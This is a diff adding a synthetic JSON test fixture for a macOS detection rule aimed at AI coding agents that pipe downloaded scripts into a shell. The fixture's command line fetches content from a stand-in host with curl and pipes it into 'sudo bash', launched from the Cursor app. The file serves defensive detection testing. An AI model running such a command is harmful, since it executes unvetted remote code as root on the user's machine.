@@ -1,0 +1,16 @@
+{
+  "_larc": {
+    "classification": "synthetic-benign",
+    "schema": "osquery",
+    "rule": "SERAPH_MacOS_Agent_Piped_Shell",
+    "expected": "match",
+    "source_fixture": "tests/fixtures/sigma/SERAPH_MacOS_Agent_Piped_Shell/positive/pipe_sudo.json",
+    "origin": "derived from the Sigma fixture, not captured from a collector"
+  },
+  "record": {
+    "path": "/bin/zsh",
+    "cmdline": "zsh -c curl --silent --max-time 1 https://example.invalid/hook | sudo bash",
+    "username": "dev",
+    "parent_path": "/Applications/Cursor.app/Contents/MacOS/Cursor"
+  }
+}
